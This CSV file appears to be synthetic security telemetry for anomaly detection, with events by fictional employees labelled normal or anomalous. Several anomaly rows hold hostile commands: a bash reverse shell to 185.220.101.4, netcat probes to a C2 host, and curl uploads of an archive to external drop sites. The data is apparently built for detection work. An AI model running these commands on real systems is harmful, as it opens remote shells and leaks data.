timestamp,user_id,username,department,ip_address,event_type,failed_login_attempts,files_affected,usb_bluetooth_usage,bytes_sent_kb,bytes_received_kb,destination_site,application_shell_cmd,status,is_anomaly,action,details
2026-03-10T01:17:04.605Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,4,0,50.7,246.8,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:19:50.838Z,usr-102,bob.martinez,FINANCE,10.0.5.45,API_REQUEST,0,2,0,219.7,54.1,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:23:01.990Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,LOGIN,0,0,0,239.9,55.6,sharepoint.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:25:39.412Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_ACCESS,0,3,0,200.7,1025.6,internal-portal.corp,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:28:24.248Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,NETWORK_CONNECTION,0,0,0,131.8,295.9,internal-portal.corp,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:31:20.961Z,usr-102,bob.martinez,FINANCE,10.0.5.45,NETWORK_CONNECTION,0,3,0,95.6,277.3,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:34:29.071Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,1,0,0,71.2,921.1,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:37:52.836Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,0,2,0,134,263.7,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:40:37.137Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,NETWORK_CONNECTION,1,28,0,6393.9,16103.8,c2-beacon-185.xyz,nc -v 185.220.101.4 443,BLOCKED,1,QUARANTINE,Outbound egress probe to adversary C2 infrastructure
2026-03-10T01:43:41.530Z,usr-105,elena.rostova,SECURITY,10.0.9.3,NETWORK_CONNECTION,0,3,0,79.5,200.9,gitlab.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:46:16.235Z,usr-103,carol.zhang,HR,10.0.2.88,LOGIN,0,4,0,88.1,390.9,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:48:42.350Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_DOWNLOAD,0,4,0,35.7,858.9,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:51:52.788Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,NETWORK_CONNECTION,0,3,0,235.4,194.6,api.github.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:54:28.384Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,3,0,231.2,202.5,gitlab.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:57:56.546Z,usr-104,david.kim,SALES,10.0.7.19,SHELL_EXECUTION,0,4,0,146.5,84.7,temp-dropzone.cc,bash -i >& /dev/tcp/185.220.101.4/4444 0>&1,BLOCKED,1,QUARANTINE,Unauthorized shell command execution attempt
2026-03-10T02:00:04.349Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,1,0,123.4,835.7,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:02:56.779Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,2,0,228.4,1076.5,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:06:12.793Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,NETWORK_CONNECTION,1,4,0,187.5,837.1,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:08:53.460Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,LOGIN,0,0,0,69.2,736.2,docs.google.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:12:20.556Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,0,2,0,31.5,859.6,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:14:36.124Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,4,0,17.5,196.1,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:17:52.429Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_DOWNLOAD,0,2,0,213.6,282.7,docs.google.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:20:13.697Z,usr-103,carol.zhang,HR,10.0.2.88,LOGIN,0,4,0,193.3,439.5,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:23:50.083Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,1,4,0,48,946.9,gitlab.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:26:47.745Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,0,0,0,140,728.7,aws.us-east-1.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:29:25.120Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,NETWORK_CONNECTION,0,2,0,42,470.8,gitlab.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:32:37.069Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,API_REQUEST,0,1,0,188.9,663.3,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:35:28.341Z,usr-102,bob.martinez,FINANCE,10.0.5.45,API_REQUEST,0,4,0,229.8,150.9,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:37:27.387Z,usr-105,elena.rostova,SECURITY,10.0.9.3,LOGIN,0,1,0,247.7,119.3,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:40:29.991Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,3,0,9.2,1044.8,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:43:33.699Z,usr-105,elena.rostova,SECURITY,10.0.9.3,NETWORK_CONNECTION,0,1,0,27.9,417.9,api.github.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:46:39.626Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,1,0,229.3,823.1,internal-portal.corp,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:49:02.859Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,NETWORK_CONNECTION,0,2,0,137.6,34.6,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:52:11.734Z,usr-104,david.kim,SALES,10.0.7.19,FILE_ACCESS,0,0,0,224.2,545.5,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:55:34.399Z,usr-102,bob.martinez,FINANCE,10.0.5.45,API_REQUEST,0,3,0,18.7,219.5,aws.us-east-1.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T02:58:05.083Z,usr-108,henry.todd,FINANCE,10.0.5.12,API_REQUEST,0,3,0,86.4,73.7,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:01:06.287Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,1,0,60.6,710.4,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:03:55.477Z,usr-103,carol.zhang,HR,10.0.2.88,LOGIN,0,2,0,235.1,1135,gitlab.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:07:01.694Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,API_REQUEST,0,0,0,64.2,76,gitlab.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:09:55.685Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,2,0,93.8,792,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:12:19.052Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,2,0,252.4,389.6,gitlab.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:15:04.137Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,3,0,165.7,623.8,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:17:48.703Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_DOWNLOAD,0,1,0,24.9,468.4,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:20:49.392Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,3,0,249,700,sharepoint.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:24:11.056Z,usr-106,frank.miller,IT,10.0.1.50,FILE_DOWNLOAD,0,4,0,233,850.6,aws.us-east-1.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:26:36.369Z,usr-103,carol.zhang,HR,10.0.2.88,API_REQUEST,0,1,0,226.2,243.8,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:29:50.461Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_ACCESS,0,4,0,92.3,327.8,sharepoint.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:32:23.471Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,1,0,221.9,1119,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:35:52.811Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_ACCESS,0,1,0,208.7,159.6,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:38:53.029Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,1,0,237.6,97.9,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:41:10.285Z,usr-105,elena.rostova,SECURITY,10.0.9.3,USB_ACTIVITY,0,52,1,93512.9,51.9,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-10T03:43:46.133Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_ACCESS,0,0,0,221.9,1144.6,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:47:10.084Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,API_REQUEST,0,2,0,97,733.3,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:50:22.571Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,LOGIN,0,3,0,223.1,847.1,internal-portal.corp,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:53:00.846Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,1,0,143,304.4,gitlab.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:56:11.095Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,LOGIN,0,0,0,183.5,222.8,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T03:58:29.322Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,0,0,0,84.3,113.5,gitlab.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:01:50.377Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,1,0,234.5,762.8,docs.google.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:04:48.380Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,3,0,173.1,1077.6,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:06:49.483Z,usr-102,bob.martinez,FINANCE,10.0.5.45,NETWORK_CONNECTION,0,3,0,32.7,669.3,api.github.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:09:49.925Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,0,1,0,90.6,617.5,docs.google.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:12:54.578Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_ACCESS,0,4,0,10.5,63.5,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:15:55.899Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,3,0,36.7,425.1,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:18:57.845Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,LOGIN,0,1,0,195.6,330.5,gitlab.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:21:17.162Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,1,0,159.9,1052.5,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:24:14.013Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,205,0,89899.9,157.4,mega-upload-cloud.ru,curl -X POST --data-binary @archive.tar.gz,SUCCESS,1,ALERT,Mass file exfiltration velocity to external site (205 files)
2026-03-10T04:27:10.583Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,2,0,206.6,402.2,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:30:26.055Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,0,0,168.1,722.6,aws.us-east-1.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:33:12.248Z,usr-106,frank.miller,IT,10.0.1.50,FILE_DOWNLOAD,0,4,0,96.2,1094.9,jira.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:36:23.909Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,1,9,0,7241.3,19649.4,c2-beacon-185.xyz,nc -v 185.220.101.4 443,BLOCKED,1,QUARANTINE,Outbound egress probe to adversary C2 infrastructure
2026-03-10T04:39:00.217Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,6,0,0,4.8,12.1,auth-sso.corp.internal,none,BLOCKED,1,BLOCK,Repeated authentication failure sequence: 6 consecutive attempts
2026-03-10T04:42:14.575Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,2,0,233.3,1143.3,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:44:50.304Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,2,0,23.6,674.1,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:47:30.156Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_ACCESS,0,3,0,70,287.3,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:50:44.652Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,4,0,20.3,901.1,docs.google.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:53:29.555Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_DOWNLOAD,0,3,0,43.4,128.3,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:56:04.353Z,usr-103,carol.zhang,HR,10.0.2.88,LOGIN,0,0,0,222,871,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T04:58:59.953Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,NETWORK_CONNECTION,1,32,0,6750.2,9776.6,c2-beacon-185.xyz,nc -v 185.220.101.4 443,BLOCKED,1,QUARANTINE,Outbound egress probe to adversary C2 infrastructure
2026-03-10T05:02:10.257Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,NETWORK_CONNECTION,0,4,0,139.4,911.7,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:04:31.553Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_DOWNLOAD,0,210,0,217764.7,202,temp-dropzone.cc,curl -X POST --data-binary @archive.tar.gz,SUCCESS,1,ALERT,Mass file exfiltration velocity to external site (210 files)
2026-03-10T05:07:37.651Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,NETWORK_CONNECTION,1,2,0,146,132.2,jira.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:10:14.464Z,usr-104,david.kim,SALES,10.0.7.19,LOGIN,5,0,0,3.7,10.6,auth-sso.corp.internal,none,FAILURE,1,BLOCK,Repeated authentication failure sequence: 5 consecutive attempts
2026-03-10T05:13:42.575Z,usr-103,carol.zhang,HR,10.0.2.88,USB_ACTIVITY,0,33,1,84235.4,185.6,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-10T05:16:40.461Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,0,0,102.4,522.8,docs.google.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:18:57.264Z,usr-106,frank.miller,IT,10.0.1.50,FILE_DOWNLOAD,0,4,0,130.8,254.6,api.github.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:22:31.597Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,API_REQUEST,0,0,0,97.1,145.3,aws.us-east-1.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:25:10.801Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,0,0,162.2,31.5,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:27:35.083Z,usr-102,bob.martinez,FINANCE,10.0.5.45,API_REQUEST,0,2,0,38.7,200.3,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:30:36.263Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,4,0,27.2,1132.7,docs.google.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:33:45.563Z,usr-108,henry.todd,FINANCE,10.0.5.12,NETWORK_CONNECTION,1,3,0,227.7,280.7,aws.us-east-1.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:36:00.420Z,usr-103,carol.zhang,HR,10.0.2.88,API_REQUEST,0,2,0,224.3,690.6,docs.google.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:39:31.402Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_ACCESS,0,3,0,53.7,640,sharepoint.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:42:27.991Z,usr-106,frank.miller,IT,10.0.1.50,FILE_DOWNLOAD,0,1,0,104,964.8,sharepoint.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:44:44.761Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,0,0,0,26,136.2,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:48:30.808Z,usr-106,frank.miller,IT,10.0.1.50,NETWORK_CONNECTION,0,1,0,251.3,129.5,internal-portal.corp,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:51:11.069Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,0,0,201.2,815.6,api.github.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:54:13.504Z,usr-108,henry.todd,FINANCE,10.0.5.12,API_REQUEST,0,0,0,150.2,741.2,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:56:12.605Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,3,0,5.5,609,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T05:59:11.966Z,usr-105,elena.rostova,SECURITY,10.0.9.3,LOGIN,0,1,0,33.2,638.9,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:02:12.091Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_DOWNLOAD,0,3,0,111.2,438.3,sharepoint.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:04:50.405Z,usr-103,carol.zhang,HR,10.0.2.88,LOGIN,0,3,0,78.1,816.1,docs.google.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:08:06.289Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_ACCESS,0,2,0,141.1,424,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:10:51.902Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,3,0,120.6,899.8,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:14:05.254Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,4,0,175.7,154.1,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:17:05.548Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,API_REQUEST,0,1,0,249,1092,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:19:23.972Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,LOGIN,0,0,0,195.1,1151.8,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:22:16.943Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,0,1,0,237.8,858,internal-portal.corp,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:25:46.247Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,0,2,0,173.6,451.7,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:28:45.296Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_DOWNLOAD,0,2,0,136.6,991,gitlab.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:30:56.354Z,usr-108,henry.todd,FINANCE,10.0.5.12,API_REQUEST,0,3,0,145.9,575.9,gitlab.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:34:29.583Z,usr-106,frank.miller,IT,10.0.1.50,USB_ACTIVITY,0,18,1,62558.1,174.5,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-10T06:36:34.440Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,3,0,173,59.6,internal-portal.corp,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:39:52.578Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,3,0,49,417.9,sharepoint.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:42:28.946Z,usr-103,carol.zhang,HR,10.0.2.88,LOGIN,1,1,0,227,662.4,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:45:35.971Z,usr-105,elena.rostova,SECURITY,10.0.9.3,NETWORK_CONNECTION,1,0,0,140.5,427.5,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:48:48.225Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,2,0,61.8,498.5,api.github.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:50:58.513Z,usr-106,frank.miller,IT,10.0.1.50,NETWORK_CONNECTION,0,4,0,109.7,75.4,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:54:11.470Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,LOGIN,0,1,0,252.7,658.3,sharepoint.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T06:57:25.353Z,usr-104,david.kim,SALES,10.0.7.19,USB_ACTIVITY,0,72,1,25658.5,149.9,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-10T06:59:39.171Z,usr-103,carol.zhang,HR,10.0.2.88,API_REQUEST,0,1,0,191.3,1078.5,gitlab.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T07:03:23.169Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,NETWORK_CONNECTION,0,3,0,104.8,820.8,sharepoint.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T07:05:30.860Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,USB_ACTIVITY,0,90,1,79186.4,136.8,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-10T07:09:07.235Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,LOGIN,0,3,0,6.6,857.2,gitlab.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T07:11:56.145Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,0,0,0,125.6,1000.2,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
